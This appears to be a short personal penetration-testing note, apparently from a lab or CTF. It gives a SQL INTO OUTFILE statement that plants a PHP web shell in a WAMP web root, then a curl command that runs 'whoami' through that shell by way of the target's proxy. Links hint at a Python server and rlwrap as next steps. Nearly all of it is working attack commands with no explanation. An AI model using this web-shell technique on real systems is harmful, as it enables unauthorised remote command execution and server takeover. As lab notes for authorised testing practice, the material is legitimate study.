---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
![[Pasted image 20221108115238.png]]

```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shelly.php';
```

![[Pasted image 20220610141248.png]]

```
curl "http://127.0.0.1:8080/shelly.php?cmd=whoami" --proxy $TARGET:3128 
```

[[TechLexicon/Penetration Testing/Reference/7._Tools/Python#Server]]

[[rlwrap]]


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
